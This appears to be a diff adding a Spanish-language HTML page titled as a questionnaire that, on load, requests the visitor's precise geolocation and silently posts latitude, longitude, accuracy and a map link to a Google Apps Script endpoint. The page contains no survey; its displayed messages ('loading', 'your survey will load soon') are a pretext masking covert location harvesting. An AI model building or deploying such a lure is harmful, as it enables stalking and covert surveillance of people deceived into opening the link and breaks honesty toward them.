@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuestionario </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 40px;
+            background-color: #f4f6f8;
+        }
+        .contenedor {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        #estado {
+            font-size: 16px;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .info { background: #e3f2fd; color: #0d47a1; }
+        .error { background: #ffebee; color: #c62828; }
+        .exito { background: #e8f5e9; color: #2e7d32; }
+    </style>
+</head>
+<body>
+
+    <div class="contenedor">
+        <h2>Cargando contenido...</h2>
+        <div id="estado" class="info">Solicitando acceso a la ubicación...</div>
+    </div>
+
+    <script>
+    // Enlace de tu aplicación web de Google Apps Script
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzAJ8QKQXuCV9kZ-Z6XzW96Zzngf6_t0x6REzTaT9nsqS8IF2W2uXizslHydeylHduJ/exec";
+
+    // Se ejecuta automáticamente al abrir la página
+    window.onload = function() {
+        obtenerUbicacion();
+    };
+
+    function obtenerUbicacion() {
+        if (!("geolocation" in navigator)) {
+            mostrarMensaje("Error: Tu navegador no soporta geolocalización.", "error");
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (posicion) => {
+                const lat = posicion.coords.latitude;
+                const lng = posicion.coords.longitude;
+                const precision = posicion.coords.accuracy;
+                const fecha = new Date().toLocaleString();
+                const enlaceMapa = `https://maps.google.com/?q=${lat},${lng}`;
+
+                mostrarMensaje("espere por favor ..", "info");
+
+                const payload = {
+                    fecha: fecha,
+                    latitud: lat,
+                    longitud: lng,
+                    precision: precision,
+                    mapa: enlaceMapa
+                };
+
+                // Envío de datos a Google Sheets
+                fetch(SCRIPT_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(() => {
+                    mostrarMensaje("¡su encuesta va cargar enseguida!", "exito");
+                })
+                .catch((error) => {
+                    mostrarMensaje("Error al conectar con Google Sheets.", "error");
+                    console.error("Error:", error);
+                });
+            },
+            (error) => {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        mostrarMensaje("Acceso a la ubicación denegado por el usuario.", "error");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        mostrarMensaje("Información de ubicación no disponible.", "error");
+                        break;
+                    case error.TIMEOUT:
+                        mostrarMensaje("Tiempo de espera agotado al consultar la ubicación.", "error");
+                        break;
+                    default:
+                        mostrarMensaje("Error al obtener ubicación: " + error.message, "error");
+                }
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+
+    function mostrarMensaje(texto, tipo) {
+        const estadoDiv = document.getElementById("estado");
+        estadoDiv.innerText = texto;
+        estadoDiv.className = tipo;
+    }
+    </script>
+</body>
+</html>
